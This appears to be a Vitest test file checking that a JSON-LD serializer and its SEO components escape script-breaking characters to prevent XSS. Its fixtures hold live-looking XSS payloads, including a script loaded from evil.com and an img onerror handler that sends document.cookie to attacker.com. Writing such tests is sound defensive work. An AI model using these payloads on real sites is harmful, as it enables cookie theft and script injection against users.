import { describe, it, expect } from "vitest";
import {
  safeJsonLd,
  IncidentJsonLd,
  ClaimReviewJsonLd,
} from "@/components/seo/json-ld";

describe("Zero-Trust Security Audit: JSON-LD XSS & Script Injection Prevention", () => {
  it("should escape '</script>' tag closing sequence to prevent DOM breakout", () => {
    const maliciousPayload = {
      title: "Harmful Incident</script><script>alert('xss')</script>",
      description: "AI Model exploit <script src='https://evil.com/payload.js'></script>",
    };

    const serialized = safeJsonLd(maliciousPayload);

    // Ensure raw '<' and '>' are NEVER present in serialized output
    expect(serialized).not.toContain("</script>");
    expect(serialized).not.toContain("<script>");
    expect(serialized).not.toContain("<");
    expect(serialized).not.toContain(">");

    // Ensure unicode escape sequences are used
    expect(serialized).toContain("\\u003c/script\\u003e");
    expect(serialized).toContain("\\u003cscript\\u003e");

    // Ensure JSON.parse correctly parses it back to original content
    const parsed = JSON.parse(serialized);
    expect(parsed.title).toBe(maliciousPayload.title);
    expect(parsed.description).toBe(maliciousPayload.description);
  });

  it("should escape HTML tags and event handlers in user-submitted descriptions", () => {
    const malicious = {
      content: '<img src="x" onerror="document.location=\'https://attacker.com/?c=\'+document.cookie" />',
      meta: '"><svg onload=alert(1)>',
    };

    const serialized = safeJsonLd(malicious);
    expect(serialized).not.toContain("<img");
    expect(serialized).not.toContain("<svg");
    expect(serialized).not.toContain("<");
    expect(serialized).not.toContain(">");

    const parsed = JSON.parse(serialized);
    expect(parsed.content).toBe(malicious.content);
    expect(parsed.meta).toBe(malicious.meta);
  });

  it("should escape unicode line and paragraph separators that cause JS parsing flaws", () => {
    const data = { text: "Line\u2028Separator and Paragraph\u2029Separator" };
    const serialized = safeJsonLd(data);
    expect(serialized).toContain("\\u2028");
    expect(serialized).toContain("\\u2029");
  });

  it("should render IncidentJsonLd component safely without raw script tags in HTML", () => {
    const element = IncidentJsonLd({
      title: "Attack Title </script><script>window.pwned=true</script>",
      description: "Description with <img src=x onerror=alert(1)>",
      url: "https://alparai.com/en/incidents/123",
      severity: "critical",
      provider: "TestProvider",
    });

    expect(element).toBeDefined();
    expect(element.type).toBe("script");
    expect(element.props.type).toBe("application/ld+json");

    const innerHtml = element.props.dangerouslySetInnerHTML.__html;
    expect(innerHtml).not.toContain("</script>");
    expect(innerHtml).not.toContain("<script>");
    expect(innerHtml).not.toContain("<");
    expect(innerHtml).not.toContain(">");

    const parsed = JSON.parse(innerHtml);
    const articleNode = parsed["@graph"].find((node: { "@id": string }) => node["@id"].endsWith("#article"));
    expect(articleNode["@type"]).toContain("Article");
    expect(articleNode.headline).toBe("Attack Title </script><script>window.pwned=true</script>");
  });

  it("should render ClaimReviewJsonLd component safely with nested attack strings", () => {
    const element = ClaimReviewJsonLd({
      url: "https://alparai.com/en/fact-check/1",
      claimReviewed: "AI claims </script><script>alert(1)</script>",
      itemReviewed: {
        name: "Claim Name <b onmouseover=alert(1)>bold</b>",
        author: "Provider </script>",
      },
      reviewRating: {
        ratingValue: 1,
        ratingExplanation: "Explanation with <iframe src=javascript:alert(1)>",
      },
    });

    const innerHtml = element.props.dangerouslySetInnerHTML.__html;
    expect(innerHtml).not.toContain("</script>");
    expect(innerHtml).not.toContain("<b");
    expect(innerHtml).not.toContain("<iframe");
    expect(innerHtml).not.toContain("<");

    const parsed = JSON.parse(innerHtml);
    expect(parsed["@type"]).toBe("ClaimReview");
    expect(parsed.claimReviewed).toBe("AI claims </script><script>alert(1)</script>");
  });
});
